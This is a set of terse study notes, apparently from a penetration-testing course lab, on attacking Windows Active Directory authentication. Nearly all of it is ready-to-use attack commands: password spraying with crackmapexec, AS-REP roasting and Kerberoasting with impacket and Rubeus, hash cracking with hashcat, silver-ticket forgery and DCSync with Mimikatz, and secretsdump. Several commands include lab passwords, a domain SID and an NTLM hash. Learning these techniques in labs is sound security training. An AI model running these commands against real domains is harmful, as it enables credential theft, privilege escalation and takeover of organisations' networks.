NTLM
Kerberos
### Cached AD credentials

hashes are stored in the Local Security Authority Subsystem Service
LSASS process is part of the operating system and runs as SYSTEM

### Password attacks
![[Spray-Passwords.ps1]]

crackmapexec smb 192.168.204.76 -u dave -p 'Flowers1' -d corp.com

### AS-REP Roasting

_Do not require Kerberos preauthentication_ enabled

impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired** on Windows

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

.\Rubeus.exe asreproast /nowrap

### Kerberoasting

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

sudo impacket-GetUserSPNs -request -dc-ip 192.168.210.70 corp.com/dave

### Silver Tickets

iwr -UseDefaultCredentials http://web04
use Mimikatz to retrieve the SPN password hash
obtain the domain SID
	from whoami /priv
	mimikatz
last list item is the target SPN
create the forged service ticket with the _kerberos::golden_ module

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

### DC Synchronization

mimikatz
	lsadump::dcsync /user:corp\dave

kali
	impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
